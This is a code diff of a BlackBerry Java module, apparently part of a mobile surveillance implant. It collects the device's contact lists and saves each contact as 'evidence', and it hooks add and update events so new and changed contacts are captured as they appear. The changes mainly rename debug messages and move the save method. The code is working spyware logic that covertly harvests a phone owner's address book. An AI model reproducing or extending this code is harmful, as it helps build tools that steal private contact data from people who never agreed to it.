@@ -121,11 +121,14 @@ public final class ModuleAddressBook extends BaseModule implements
     public void actualLoop() {
         //#ifdef DEBUG
         debug.trace("actualRun"); //$NON-NLS-1$
+        if (markup.isMarkup()) {
+            markup.removeMarkup();
+        }
         //#endif
 
         if (!markup.isMarkup()) {
             //#ifdef DEBUG
-            debug.trace("actualRun: getting Contact List"); //$NON-NLS-1$
+            debug.info("actualLoop: getting Contact List"); //$NON-NLS-1$
             //#endif
 
             if (getContactList()) {
@@ -143,7 +146,7 @@ public final class ModuleAddressBook extends BaseModule implements
 
         String[] lists = PIM.getInstance().listPIMLists(PIM.CONTACT_LIST);
         //#ifdef DEBUG
-        debug.trace("actualRun lists: " + lists.length); //$NON-NLS-1$
+        debug.trace("getContactList lists: " + lists.length); //$NON-NLS-1$
         //#endif
 
         boolean ret = true;
@@ -152,14 +155,14 @@ public final class ModuleAddressBook extends BaseModule implements
             try {
                 String name = lists[i];
                 //#ifdef DEBUG
-                debug.trace("actualRun: opening " + name); //$NON-NLS-1$
+                debug.trace("getContactList: opening " + name); //$NON-NLS-1$
                 //#endif
                 contactList = (ContactList) PIM.getInstance().openPIMList(
                         PIM.CONTACT_LIST, PIM.READ_ONLY, name);
 
                 number = saveContactEvidence(contactList);
                 //#ifdef DEBUG
-                debug.trace("actualRun: saved " + number); //$NON-NLS-1$
+                debug.trace("getContactList: saved " + number); //$NON-NLS-1$
                 //#endif
 
             } catch (final PIMException e) {
@@ -172,6 +175,26 @@ public final class ModuleAddressBook extends BaseModule implements
         }
         return ret;
 
+    }
+
+    private void save(Contact item) {
+        try {
+            //#ifdef DEBUG
+            debug.trace("save: " + item);
+            //#endif
+
+            final ContactList contactList = (ContactList) item.getPIMList();
+            final BlackBerryContact contact = (BlackBerryContact) item;
+            final byte[] payload = getContactPacket(contactList, contact);
+
+            Evidence evidence = new Evidence(EvidenceType.ADDRESSBOOK);
+            evidence.atomicWriteOnce(payload);
+
+        } catch (final Exception ex) {
+            //#ifdef DEBUG
+            debug.error(ex);
+            //#endif
+        }
     }
 
     private int saveContactEvidence(ContactList contactList)
@@ -245,7 +268,7 @@ public final class ModuleAddressBook extends BaseModule implements
             if (contact.countValues(Contact.UID) > 0) {
                 final String suid = contact.getString(Contact.UID, 0);
                 //#ifdef DEBUG
-                debug.trace("actualRun uid: " + suid); //$NON-NLS-1$
+                debug.info("getContactPacket uid: " + suid); //$NON-NLS-1$
                 //#endif
                 try {
                     uid = Integer.parseInt(suid);
@@ -579,21 +602,10 @@ public final class ModuleAddressBook extends BaseModule implements
         }
     }
 
-    /*
-     * (non-Javadoc)
-     * @see blackberry.agent.Agent#parse(byte[])
-     */
-    protected boolean parse(final byte[] confParameters) {
-        //#ifdef DEBUG
-        debug.trace("parse"); //$NON-NLS-1$
-        //#endif
-        return true;
-    }
-
     public void itemAdded(PIMItem item) {
         init();
         //#ifdef DEBUG
-        debug.trace("itemAdded: " + item); //$NON-NLS-1$
+        debug.info("itemAdded: " + item); //$NON-NLS-1$
         //#endif
         save((Contact) item);
     }
@@ -608,27 +620,10 @@ public final class ModuleAddressBook extends BaseModule implements
     public void itemUpdated(PIMItem itemOld, PIMItem itemNew) {
         init();
         //#ifdef DEBUG
-        debug.trace("itemUpdated: " + itemNew); //$NON-NLS-1$
+        debug.info("itemUpdated: " + itemNew); //$NON-NLS-1$
         //#endif
 
         save((Contact) itemNew);
-    }
-
-    private void save(Contact item) {
-        try {
-
-            final ContactList contactList = (ContactList) item.getPIMList();
-            final BlackBerryContact contact = (BlackBerryContact) item;
-            final byte[] payload = getContactPacket(contactList, contact);
-
-            Evidence evidence = new Evidence(EvidenceType.ADDRESSBOOK);
-            evidence.atomicWriteOnce(payload);
-
-        } catch (final Exception ex) {
-            //#ifdef DEBUG
-            debug.error(ex);
-            //#endif
-        }
     }
 
     private synchronized void init() {
